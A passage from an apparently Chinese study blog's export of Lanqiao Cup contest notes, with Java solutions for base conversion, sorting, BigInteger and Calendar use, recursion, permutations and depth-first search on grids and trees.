"2";</span></span><br><span class="line"><span class="comment">//			case "011":</span></span><br><span class="line"><span class="comment">//				return "3";</span></span><br><span class="line"><span class="comment">//			case "100":</span></span><br><span class="line"><span class="comment">//				return "4";</span></span><br><span class="line"><span class="comment">//			case "101":</span></span><br><span class="line"><span class="comment">//				return "5";</span></span><br><span class="line"><span class="comment">//			case "110":</span></span><br><span class="line"><span class="comment">//				return "6";</span></span><br><span class="line"><span class="comment">//			case "111":</span></span><br><span class="line"><span class="comment">//				return "7";	</span></span><br><span class="line"><span class="comment">//		&#125;return "";</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/15/10-28/image-20210115102701132.png" alt="image-20210115102701132"></p>
<p>照着网上的敲的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">two12</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> String[] bin = &#123;<span class="string">"0000"</span>,<span class="string">"0001"</span>,<span class="string">"0010"</span>,<span class="string">"0011"</span>,</span><br><span class="line">	                       <span class="string">"0100"</span>,<span class="string">"0101"</span>,<span class="string">"0110"</span>,<span class="string">"0111"</span>,</span><br><span class="line">	                       <span class="string">"1000"</span>,<span class="string">"1001"</span>,<span class="string">"1010"</span>,<span class="string">"1011"</span>,</span><br><span class="line">	                       <span class="string">"1100"</span>,<span class="string">"1101"</span>,<span class="string">"1110"</span>,<span class="string">"1111"</span>&#125;;</span><br><span class="line">	<span class="keyword">static</span> String[] oct = &#123;<span class="string">"0"</span>,<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,</span><br><span class="line">						   <span class="string">"8"</span>,<span class="string">"9"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"e"</span>,<span class="string">"f"</span>&#125;;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> n = scan.nextInt();</span><br><span class="line">		String [] str = <span class="keyword">new</span> String[n];</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">			str[i] = scan.next();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">			String result = hexToBin(str[i]).toString();</span><br><span class="line">			String octResult = binToOct(result);</span><br><span class="line">			<span class="keyword">if</span>(octResult.startsWith(<span class="string">"0"</span>)) &#123;</span><br><span class="line">				octResult = octResult.substring(<span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(octResult.startsWith(<span class="string">"0"</span>)) &#123;</span><br><span class="line">				octResult = octResult.substring(<span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println(octResult);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//十六进制转换成二进制</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> StringBuffer <span class="title">hexToBin</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> length = str.length();</span><br><span class="line">		<span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> end = <span class="number">1</span>;</span><br><span class="line">		StringBuffer result = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length;i++) &#123;</span><br><span class="line">			String subStr = str.substring(start,end);</span><br><span class="line">			start++;</span><br><span class="line">			end++;</span><br><span class="line">			String s = transform(subStr);</span><br><span class="line">			result.append(s);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">binToOct</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> length = str.length();</span><br><span class="line">		<span class="keyword">if</span>(length % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">			str = <span class="string">"00"</span>+str;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(length % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">			str = <span class="string">"0"</span> + str;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> end = <span class="number">3</span>;</span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;str.length()/<span class="number">3</span>;i++) &#123;</span><br><span class="line">			String subStr = str.substring(start,end);</span><br><span class="line">			start += <span class="number">3</span>;</span><br><span class="line">			end += <span class="number">3</span>;</span><br><span class="line">			String s= transform2(subStr);</span><br><span class="line">			sb.append(s);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">transform</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		String result = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">switch</span>(str) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"0"</span>:result = bin[<span class="number">0</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"1"</span>:result = bin[<span class="number">1</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"2"</span>:result = bin[<span class="number">2</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"3"</span>:result = bin[<span class="number">3</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"4"</span>:result = bin[<span class="number">4</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"5"</span>:result = bin[<span class="number">5</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"6"</span>:result = bin[<span class="number">6</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"7"</span>:result = bin[<span class="number">7</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"8"</span>:result = bin[<span class="number">8</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"9"</span>:result = bin[<span class="number">9</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"A"</span>:result = bin[<span class="number">10</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"B"</span>:result = bin[<span class="number">11</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"C"</span>:result = bin[<span class="number">12</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"D"</span>:result = bin[<span class="number">13</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"E"</span>:result = bin[<span class="number">14</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"F"</span>:result = bin[<span class="number">15</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">transform2</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		String result = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">switch</span>(str) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"000"</span>:result = oct[<span class="number">0</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"001"</span>:result = oct[<span class="number">1</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"010"</span>:result = oct[<span class="number">2</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"011"</span>:result = oct[<span class="number">3</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"100"</span>:result = oct[<span class="number">4</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"101"</span>:result = oct[<span class="number">5</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"110"</span>:result = oct[<span class="number">6</span>];<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"111"</span>:result = oct[<span class="number">7</span>];<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>嗯嗯，思路还行，，，就是内存和时间限制，，，就有问题了，，，咋也不知道，咋也不敢问。。。。</p>
</blockquote>
<h2 id="数列排序"><a href="#数列排序" class="headerlink" title="数列排序"></a>数列排序</h2><p>使用list或者array的sort方法</p>
<h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sort</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> n = scan.nextInt();</span><br><span class="line">		List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ;i&lt;n;i++) &#123;</span><br><span class="line">			list.add(scan.nextInt());</span><br><span class="line">		&#125;</span><br><span class="line">		Collections.sort(list);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ;i&lt;n;i++) &#123;</span><br><span class="line">			System.out.print(list.get(i)+<span class="string">" "</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="array"><a href="#array" class="headerlink" title="array"></a>array</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sort2</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> n = scan.nextInt();</span><br><span class="line">		<span class="keyword">int</span> [] arr = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ;i&lt;n;i++) &#123;</span><br><span class="line">			arr[i] = scan.nextInt();</span><br><span class="line">		&#125;</span><br><span class="line">		Arrays.sort(arr);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ;i&lt;n;i++) &#123;</span><br><span class="line">			System.out.print(arr[i]+<span class="string">" "</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="经常使用的"><a href="#经常使用的" class="headerlink" title="经常使用的"></a>经常使用的</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="keyword">int</span> n = scan.nextInt();</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> n = <span class="keyword">new</span> Scanner(System.in).nextInt();</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> [] arr = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line"></span><br><span class="line">arr[i] = scan.nextInt();</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ;i&lt;n;i++) &#123;</span><br><span class="line">			</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.print(list);</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ;i&lt;n;i++) &#123;</span><br><span class="line">	list.add(scan.nextInt());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>蓝桥杯</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝桥杯真题解析</title>
    <url>/2021/03/08/12-17/</url>
    <content><![CDATA[<blockquote>
<p>一些记录：看视频<a href="https://www.bilibili.com/video/BV1GE411F7Pj?p=1" target="_blank" rel="noopener">【蓝桥杯】2013年-2018年蓝桥杯历年省赛真题 Java C++ A组 B组 C组</a></p>
<p>emmm，参加完校赛，被完虐，，，感觉蓝桥杯的题太简单，，，，接下来换地方去学leetcode一段时间</p>
</blockquote>
<h2 id="2013-java-A"><a href="#2013-java-A" class="headerlink" title="2013-java-A"></a>2013-java-A</h2><blockquote>
<p>视频的总结</p>
<p><img src="/2021/03/08/12-17/image-20210304145315375.png" alt="image-20210304145315375"></p>
</blockquote>
<h3 id="1-日历"><a href="#1-日历" class="headerlink" title="1 日历"></a>1 日历</h3><blockquote>
<p>Calendar API的使用</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Calendar calendar = Calendar.getInstance();<span class="comment">//创建实例</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置年月日</span></span><br><span class="line">calendar.set(Calendar.YEAR, year);</span><br><span class="line">calendar.set(Calendar.MONTH, <span class="number">11</span>);<span class="comment">//从0开始，11代表12月</span></span><br><span class="line">calendar.set(Calendar.DAY_OF_MONTH, <span class="number">31</span>);<span class="comment">//从1开始，代表该月第31天</span></span><br><span class="line"></span><br><span class="line">Calendar.DAY_OF_WEEK<span class="comment">//代表这天是一周里的星期几</span></span><br></pre></td></tr></table></figure>
<h3 id="2-从我做起振兴中华"><a href="#2-从我做起振兴中华" class="headerlink" title="2 从我做起振兴中华"></a>2 从我做起振兴中华</h3><blockquote>
<p>递归的思路，学习</p>
</blockquote>
<p><img src="/2021/03/08/12-17/image-20210215133419619.png" alt="image-20210215133419619"></p>
<p>观察可得，走法要么走右，要么走下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i == <span class="number">4</span> || j == <span class="number">3</span>) <span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//走到，成功</span></span><br><span class="line">	<span class="keyword">return</span> f(i+<span class="number">1</span>,j) + f(i,j+<span class="number">1</span>);<span class="comment">//下或右</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-BigInteger"><a href="#3-BigInteger" class="headerlink" title="3 BigInteger"></a>3 BigInteger</h3><blockquote>
<p>BigInteger API的使用，主要解决大数问题</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigInteger x = BigInteger.valueOf(<span class="number">2</span>).pow(<span class="number">11213</span>).subtract(BigInteger.ONE);<span class="comment">//创建</span></span><br></pre></td></tr></table></figure>
<p>上面的式子等价于：<code>2^11213-1</code></p>
<p>创建数都要用<code>BigInteger.valueOf(2)</code>创建一个对象，幂次的话，可以直接用数(幂不是大数)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s = x.toString();<span class="comment">//可以转字符串</span></span><br></pre></td></tr></table></figure>
<h3 id="4-颠倒数字"><a href="#4-颠倒数字" class="headerlink" title="4 颠倒数字"></a>4 颠倒数字</h3><blockquote>
<p>根据题目意思，一步步编程即可</p>
</blockquote>
<p>循环，有调转，可以再来一个循环变量j</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = s.length()-<span class="number">1</span>,j=<span class="number">0</span>; i&gt;=<span class="number">0</span>; i--,j++) &#123;</span><br><span class="line">	<span class="keyword">char</span> c = s.charAt(i);</span><br><span class="line">	<span class="keyword">if</span>(c==<span class="string">'6'</span>)ans[j] = <span class="string">'9'</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">'9'</span>) ans[j]=<span class="string">'6'</span>;</span><br><span class="line">	<span class="keyword">else</span> ans[j] = c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5-希尔排序"><a href="#5-希尔排序" class="headerlink" title="5  希尔排序"></a>5  希尔排序</h3><blockquote>
<p>希尔排序的变种</p>
</blockquote>
<h4 id="填空题tip"><a href="#填空题tip" class="headerlink" title="填空题tip"></a>填空题tip</h4><ol>
<li>将给定的代码复制过来</li>
<li>将___注释，运行</li>
<li>自己写main函数</li>
<li>根据特殊情况验证</li>
</ol>
<h3 id="6-逆波兰序"><a href="#6-逆波兰序" class="headerlink" title="6 逆波兰序"></a>6 逆波兰序</h3><p>没什么说的，，，</p>
<h3 id="7-断号和连号"><a href="#7-断号和连号" class="headerlink" title="7 断号和连号"></a>7 断号和连号</h3><h4 id="每行数据长度不等的输入"><a href="#每行数据长度不等的输入" class="headerlink" title="每行数据长度不等的输入"></a>每行数据长度不等的输入</h4><p><img src="/2021/03/08/12-17/image-20210218145738807.png" alt="image-20210218145738807"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="keyword">int</span> N = scan.nextInt();</span><br><span class="line">scan.nextLine();<span class="comment">//去掉'\n'</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">String line = scan.nextLine();</span><br><span class="line">String [] split = line.split(<span class="string">" "</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; split.length; j++) &#123;</span><br><span class="line">		list.add(Integer.parseInt(split[j]));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="8-全排列"><a href="#8-全排列" class="headerlink" title="8 全排列"></a>8 全排列</h3><blockquote>
<p>全排列</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> k)</span> </span>&#123;<span class="comment">//k:确认某一个排列的第k位</span></span><br><span class="line">		<span class="keyword">if</span>(k==<span class="number">9</span>) &#123;<span class="comment">//全部确认</span></span><br><span class="line">			check(arr);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//选定第k位</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = k; i &lt; arr.length; i++) &#123;</span><br><span class="line">			<span class="comment">//将第i位和第k位交换</span></span><br><span class="line">			<span class="keyword">int</span> t = arr[i];</span><br><span class="line">			arr[i] = arr[k];</span><br><span class="line">			arr[k] = t;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//移交下一层去确认k+1位</span></span><br><span class="line">			f(arr,k+<span class="number">1</span>);</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//回溯(换回来)</span></span><br><span class="line">			t = arr[i];</span><br><span class="line">			arr[i] = arr[k];</span><br><span class="line">			arr[k] = t;</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h3 id="9-深搜索"><a href="#9-深搜索" class="headerlink" title="9 深搜索"></a>9 深搜索</h3><blockquote>
<p>dfs，参数根据变化的量来确定</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> steps, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (i &lt; <span class="number">0</span> || i == n || j &lt; <span class="number">0</span> || j == m||vis[i][j] ==<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(sum == total /<span class="number">2</span>) &#123;</span><br><span class="line">		ans = Math.min(steps, ans);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(sum &gt; total /<span class="number">2</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	vis[i][j]=<span class="number">1</span>;</span><br><span class="line">	dfs(i + <span class="number">1</span>, j, steps + <span class="number">1</span>, sum + g[i][j]);</span><br><span class="line">	dfs(i - <span class="number">1</span>, j, steps + <span class="number">1</span>, sum + g[i][j]);</span><br><span class="line">	dfs(i, j + <span class="number">1</span>, steps + <span class="number">1</span>, sum + g[i][j]);</span><br><span class="line">	dfs(i, j - <span class="number">1</span>, steps + <span class="number">1</span>, sum + g[i][j]);</span><br><span class="line">	vis[i][j]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="10-邻接图-深搜索-树的直径"><a href="#10-邻接图-深搜索-树的直径" class="headerlink" title="10 邻接图 + 深搜索 + 树的直径"></a>10 邻接图 + 深搜索 + 树的直径</h3><h4 id="树的直径"><a href="#树的直径" class="headerlink" title="树的直径"></a>树的直径</h4><p>找到树上距离最大的点方法：</p>
<ol>
<li>任意选一点，找到距离最大的点</li>
<li>用距离最大的点作为一个端点，再找另外一个端点即可。</li>
</ol>
<h4 id="邻接图"><a href="#邻接图" class="headerlink" title="邻接图"></a>邻接图</h4><h5 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;Node&gt;[] g;<span class="comment">// 图的领接表</span></span><br></pre></td></tr></table></figure>
<h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">g = <span class="keyword">new</span> List[n + <span class="number">1</span>];<span class="comment">//list还需要初始化</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">	g[i] = <span class="keyword">new</span> ArrayList&lt;Node&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">	g[a].add(<span class="keyword">new</span> Node(b, c));</span><br><span class="line">	g[b].add(<span class="keyword">new</span> Node(a, c));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num;</span><br><span class="line">	<span class="keyword">long</span> dis;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">int</span> num, <span class="keyword">long</span> dis)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		<span class="keyword">this</span>.num = num;</span><br><span class="line">		<span class="keyword">this</span>.dis = dis;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="dfs"><a href="#dfs" class="headerlink" title="dfs"></a>dfs</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> from, <span class="keyword">int</span> num, <span class="keyword">long</span> dis)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">boolean</span> isLeaf = <span class="keyword">true</span>;</span><br><span class="line">	List&lt;Node&gt; neighbors = g[num];<span class="comment">// 所有的子节点</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; neighbors.size(); i++) &#123;</span><br><span class="line">		Node neighbor = neighbors.get(i);</span><br><span class="line">		<span class="keyword">if</span> (neighbor.num == from)</span><br><span class="line">			<span class="keyword">continue</span>;<span class="comment">// 如果父亲又变成了儿子不合理，，，故排除</span></span><br><span class="line">		isLeaf = <span class="keyword">false</span>;<span class="comment">// 只要有邻居，肯定不是叶子节点</span></span><br><span class="line">		dfs(num, neighbor.num, dis+neighbor.dis);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 是叶子节点</span></span><br><span class="line">	<span class="keyword">if</span> (isLeaf &amp;&amp; dis&gt; max) &#123;</span><br><span class="line">		max = dis;</span><br><span class="line">		pnt = num;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2014-java-A"><a href="#2014-java-A" class="headerlink" title="2014-java-A"></a>2014-java-A</h2><h3 id="1-根据内容、常识编程"><a href="#1-根据内容、常识编程" class="headerlink" title="1 根据内容、常识编程"></a>1 根据内容、常识编程</h3><p>由于年轻女孩，，，可以简单的默认年龄是1-20进行尝试</p>
<h3 id="2-递归，深搜"><a href="#2-递归，深搜" class="headerlink" title="2 递归，深搜"></a>2 递归，深搜</h3><blockquote>
<p>边界要判定好</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> dian,<span class="keyword">int</span> hua,<span class="keyword">int</span> jiu)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(dian ==<span class="number">0</span> &amp;&amp; hua ==<span class="number">0</span> &amp;&amp; jiu == <span class="number">1</span>) &#123;</span><br><span class="line">		ans++;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(dian &gt; <span class="number">0</span>) dfs(dian-<span class="number">1</span>,hua,jiu*<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span>(hua &gt; <span class="number">0</span>) dfs(dian,hua-<span class="number">1</span>,jiu-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-对数字的每一位排序"><a href="#3-对数字的每一位排序" class="headerlink" title="3 对数字的每一位排序"></a>3 对数字的每一位排序</h3><h4 id="数字转字符串"><a href="#数字转字符串" class="headerlink" title="数字转字符串"></a>数字转字符串</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String.valueOf(src);</span><br></pre></td></tr></table></figure>
